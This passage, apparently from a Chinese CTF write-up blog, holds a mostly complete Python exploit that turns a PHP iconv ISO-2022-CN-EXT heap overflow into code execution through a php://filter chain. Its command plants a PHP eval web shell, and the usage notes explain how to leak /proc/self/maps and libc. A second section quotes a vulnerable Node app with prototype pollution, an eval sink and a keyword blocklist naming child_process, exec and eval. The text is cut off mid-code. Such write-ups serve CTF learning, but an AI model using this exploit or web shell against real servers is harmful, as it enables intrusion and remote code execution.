(HEAP_SIZE-<span class="number">1</span>) == <span class="number">0</span></span><br><span class="line">        <span class="keyword">and</span> region.path == <span class="string">&quot;&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> heaps:</span><br><span class="line">        exit(<span class="string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)</span><br><span class="line"></span><br><span class="line">    first = heaps[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(heaps) &gt; <span class="number">1</span>:</span><br><span class="line">        heaps = <span class="string">&quot;, &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">hex</span>, heaps))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Potential heaps: &quot;</span>+heaps+<span class="string">&quot; (using first)&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]Using &quot;</span>+<span class="built_in">hex</span>(first)+<span class="string">&quot; as heap&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> first</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_regions</span>(<span class="params">maps_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;D:\\lost and found\\CTF\\pocs\\lfi2rce\\utils\\maps&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    maps = f.read().decode()</span><br><span class="line">    PATTERN = re.<span class="built_in">compile</span>(</span><br><span class="line">        <span class="string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="string">r&quot;.*&quot;</span> <span class="string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="string">r&quot;(.*)&quot;</span></span><br><span class="line">    )</span><br><span class="line">    regions = []</span><br><span class="line">    <span class="keyword">for</span> region <span class="keyword">in</span> maps.split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">        <span class="comment">#print(region)</span></span><br><span class="line">        <span class="keyword">match</span> = PATTERN.<span class="keyword">match</span>(region)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span> :</span><br><span class="line">            start = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">            stop = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">            permissions = <span class="keyword">match</span>.group(<span class="number">3</span>)</span><br><span class="line">            path = <span class="keyword">match</span>.group(<span class="number">4</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;/&quot;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">                path = path.rsplit(<span class="string">&quot; &quot;</span>, <span class="number">1</span>)[-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                path = <span class="string">&quot;&quot;</span></span><br><span class="line">            current = Region(start, stop, permissions, path)</span><br><span class="line">            regions.append(current)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]Unable to parse memory mappings&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Got &quot;</span>+ <span class="built_in">str</span>(<span class="built_in">len</span>(regions)) + <span class="string">&quot; memory regions&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> regions</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_symbols_and_addresses</span>(<span class="params">regions</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># PHP&#x27;s heap</span></span><br><span class="line">    heap = find_main_heap(regions)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Libc</span></span><br><span class="line">    libc_info = _get_region(regions, <span class="string">&quot;libc-&quot;</span>, <span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> heap, libc_info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exploit_path</span>(<span class="params">libc, heap, sleep, padding, cmd</span>):</span><br><span class="line">    LIBC = libc</span><br><span class="line">    ADDR_EMALLOC = LIBC.symbols[<span class="string">&quot;__libc_malloc&quot;</span>]</span><br><span class="line">    ADDR_EFREE = LIBC.symbols[<span class="string">&quot;__libc_system&quot;</span>]</span><br><span class="line">    ADDR_EREALLOC = LIBC.symbols[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line">    ADDR_HEAP = heap</span><br><span class="line">    ADDR_FREE_SLOT = ADDR_HEAP + <span class="number">0x20</span></span><br><span class="line">    ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="number">0x0168</span></span><br><span class="line"></span><br><span class="line">    ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    CS = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pad needs to stay at size 0x100 at every step</span></span><br><span class="line">    pad_size = CS - <span class="number">0x18</span></span><br><span class="line">    pad = <span class="string">b&quot;\x00&quot;</span> * pad_size</span><br><span class="line">    pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">    pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">    pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">    pad = compressed_bucket(pad)</span><br><span class="line"></span><br><span class="line">    step1_size = <span class="number">1</span></span><br><span class="line">    step1 = <span class="string">b&quot;\x00&quot;</span> * step1_size</span><br><span class="line">    step1 = chunked_chunk(step1)</span><br><span class="line">    step1 = chunked_chunk(step1)</span><br><span class="line">    step1 = chunked_chunk(step1, CS)</span><br><span class="line">    step1 = compressed_bucket(step1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span></span><br><span class="line">    <span class="comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span></span><br><span class="line"></span><br><span class="line">    step2_size = <span class="number">0x48</span></span><br><span class="line">    step2 = <span class="string">b&quot;\x00&quot;</span> * (step2_size + <span class="number">8</span>)</span><br><span class="line">    step2 = chunked_chunk(step2, CS)</span><br><span class="line">    step2 = chunked_chunk(step2)</span><br><span class="line">    step2 = compressed_bucket(step2)</span><br><span class="line"></span><br><span class="line">    step2_write_ptr = <span class="string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)</span><br><span class="line">    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)</span><br><span class="line">    step2_write_ptr = chunked_chunk(step2_write_ptr)</span><br><span class="line">    step2_write_ptr = compressed_bucket(step2_write_ptr)</span><br><span class="line"></span><br><span class="line">    step3_size = CS</span><br><span class="line"></span><br><span class="line">    step3 = <span class="string">b&quot;\x00&quot;</span> * step3_size</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(step3) == CS</span><br><span class="line">    step3 = chunked_chunk(step3)</span><br><span class="line">    step3 = chunked_chunk(step3)</span><br><span class="line">    step3 = chunked_chunk(step3)</span><br><span class="line">    step3 = compressed_bucket(step3)</span><br><span class="line"></span><br><span class="line">    step3_overflow = <span class="string">b&quot;\x00&quot;</span> * (step3_size - <span class="built_in">len</span>(BUG)) + BUG</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(step3_overflow) == CS</span><br><span class="line">    step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">    step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">    step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">    step3_overflow = compressed_bucket(step3_overflow)</span><br><span class="line"></span><br><span class="line">    step4_size = CS</span><br><span class="line">    step4 = <span class="string">b&quot;=00&quot;</span> + <span class="string">b&quot;\x00&quot;</span> * (step4_size - <span class="number">1</span>)</span><br><span class="line">    step4 = chunked_chunk(step4)</span><br><span class="line">    step4 = chunked_chunk(step4)</span><br><span class="line">    step4 = chunked_chunk(step4)</span><br><span class="line">    step4 = compressed_bucket(step4)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span></span><br><span class="line">    <span class="comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span></span><br><span class="line">    step4_pwn = ptr_bucket(</span><br><span class="line">        <span class="number">0x200000</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="comment"># free_slot</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        ADDR_CUSTOM_HEAP,  <span class="comment"># 0x18</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        ADDR_HEAP,  <span class="comment"># 0x140</span></span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        size=CS,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    step4_custom_heap = ptr_bucket(</span><br><span class="line">        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="number">0x18</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    step4_use_custom_heap_size = <span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">    COMMAND = cmd</span><br><span class="line">    COMMAND = <span class="string">f&quot;kill -9 $PPID; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> sleep:</span><br><span class="line">        COMMAND = <span class="string">f&quot;sleep <span class="subst">&#123;sleep&#125;</span>; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line">    COMMAND = COMMAND.encode() + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> (</span><br><span class="line">        <span class="built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size</span><br><span class="line">    ), <span class="string">f&quot;Command too big (<span class="subst">&#123;<span class="built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="subst">&#123;<span class="built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span></span><br><span class="line">    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    step4_use_custom_heap = COMMAND</span><br><span class="line">    step4_use_custom_heap = qpe(step4_use_custom_heap)</span><br><span class="line">    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)</span><br><span class="line">    pages = (</span><br><span class="line">        step4 * <span class="number">3</span></span><br><span class="line">        + step4_pwn</span><br><span class="line">        + step4_custom_heap</span><br><span class="line">        + step4_use_custom_heap</span><br><span class="line">        + step3_overflow</span><br><span class="line">        + pad * padding</span><br><span class="line">        + step1 * <span class="number">3</span></span><br><span class="line">        + step2_write_ptr</span><br><span class="line">        + step2 * <span class="number">2</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    resource = compress(compress(pages))</span><br><span class="line">    resource = b64(resource)</span><br><span class="line">    resource = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;resource.decode()&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    filters = [</span><br><span class="line">        <span class="comment"># Create buckets</span></span><br><span class="line">        <span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Step 0: Setup heap</span></span><br><span class="line">        <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Step 1: Reverse FL order</span></span><br><span class="line">        <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Step 2: Put fake pointer and make FL order back to normal</span></span><br><span class="line">        <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Step 3: Trigger overflow</span></span><br><span class="line">        <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span></span><br><span class="line">        <span class="string">&quot;convert.quoted-printable-decode&quot;</span>,</span><br><span class="line">        <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    filters = <span class="string">&quot;|&quot;</span>.join(filters)</span><br><span class="line">    path = <span class="string">f&quot;php://filter/read=<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;resource&#125;</span>&quot;</span></span><br><span class="line">    <span class="comment"># path = path.replace(&quot;+&quot;, &quot;%2b&quot;) # 由于这里是反序列化提交filename，所以我们不需要把加号换成%2b</span></span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line">maps_path = <span class="string">&#x27;./utils/maps&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;echo &quot;&lt;?php eval(\$_GET[1]);?&gt;&quot; &gt; test.php&#x27;</span></span><br><span class="line">sleep_time = <span class="number">1</span></span><br><span class="line">padding = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(maps_path):</span><br><span class="line">    exit(<span class="string">&quot;[-]no maps file&quot;</span>)</span><br><span class="line"></span><br><span class="line">regions = get_regions(maps_path)</span><br><span class="line"><span class="built_in">print</span>(regions)</span><br><span class="line">heap, libc_info = get_symbols_and_addresses(regions)</span><br><span class="line"></span><br><span class="line">libc_path = libc_info.path</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]download: &quot;</span>+libc_path)</span><br><span class="line"></span><br><span class="line">libc_path = <span class="string">&#x27;./utils/so&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(libc_path):</span><br><span class="line">    exit(<span class="string">&quot;[-]no libc file&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path, checksec=<span class="literal">False</span>)</span><br><span class="line">libc.address = libc_info.start</span><br><span class="line"></span><br><span class="line">payload = build_exploit_path(libc, heap, sleep_time, padding, cmd)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]payload:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
<p>使用方法：</p>
<ul>
<li>首先利用<code>file_get_contents()</code>读到<code>/proc/self/maps</code>并保存到本地，注意maps的格式必须是一行行的，而不是一行写下去的那种。</li>
<li>然后运行一次exp，这个时候它会打印<code>[*]download: xxx</code>，这个xxx是我们需要的libc</li>
<li>再利用<code>file_get_contents()</code>获取上一步中给出的<code>libc</code>并保存</li>
<li>最后再运行一次，得到payload</li>
<li>对<code>maps</code>和<code>libc</code>个人的处理方式就是利用<code>base64</code>加密获取到结果后再解密保存</li>
</ul>
<p>最后将payload赋值给<code>filename</code>就能够写如一个shell，调用<code>/readflag</code>即可：<img src="/posts/10200/2.png" class title="awa"></p>
<h1><span id="notadmin"> notadmin</span></h1>
<p>题目给出了附件，一眼顶针能够鉴定为原型链污染，并且在<code>/login</code>的时候可以进行污染：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> &#123; <span class="title class_">User</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./user&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tmp_user = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">authenticateToken</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> authHeader = req.<span class="property">headers</span>[<span class="string">&#x27;authorization&#x27;</span>];</span><br><span class="line">    <span class="keyword">const</span> token = authHeader;</span><br><span class="line">    <span class="keyword">if</span> (tmp_user.<span class="property">secretKey</span> == <span class="literal">undefined</span>) &#123;</span><br><span class="line">        tmp_user.<span class="property">secretKey</span> = crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, tmp_user.<span class="property">secretKey</span>);</span><br><span class="line">        req.<span class="property">user</span> = decoded;</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ex) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid token.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(b[c]));</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">check</span>(b[c])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a.<span class="title function_">hasOwnProperty</span>(c) &amp;&amp; b.<span class="title function_">hasOwnProperty</span>(c) &amp;&amp; <span class="keyword">typeof</span> a[c] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> b[c] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">                <span class="title function_">merge</span>(a[c], b[c]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                a[c] = b[c];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(tmp_user.<span class="property">secretKey</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> check = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> input = <span class="regexp">/const|var|let|return|subprocess|Array|constructor|load|push|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base|&quot;|&#x27;|\\|\[|\+|\*/ig</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> str === <span class="string">&#x27;object&#x27;</span> &amp;&amp; str !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> str) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_">check</span>(key)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_">check</span>(str[key])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> !input.<span class="title function_">test</span>(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">merge</span>(tmp_user, req.<span class="property">body</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tmp_user.<span class="property">secretKey</span> == <span class="literal">undefined</span>) &#123;</span><br><span class="line">            tmp_user.<span class="property">secretKey</span> = crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">User</span>.<span class="title function_">verifyLogin</span>(tmp_user.<span class="property">password</span>)) &#123;</span><br><span class="line">            <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">username</span>: tmp_user.<span class="property">username</span> &#125;, tmp_user.<span class="property">secretKey</span>);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Login successful! Token: <span class="subst">$&#123;token&#125;</span>\nBut nothing happend~`</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;Login failed!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;Hacker denied!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">authenticateToken</span>(req, res, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        backcode = <span class="built_in">eval</span>(tmp_user.<span class="property">code</span>)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;something happend~&quot;</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>可以看到当我们访问<code>/</code>的时候可以在通过<code>authenticateToken</code>之后进行<code>eval(tmp_user.code)</code>，很明显这<code>tmp_user.code</code>并不存在，需要我们进行原型链污染</p>
<p>题目还有一个check函数：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> check = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> input = <span class="regexp">/const|var|let|return|subprocess|Array|constructor|load|push|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base|&quot;|&#x27;|\\|\[|\+|\*/ig</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> str === <span class="string">&#x27;object&#x27;</span> &amp;&amp; str !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> str) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title 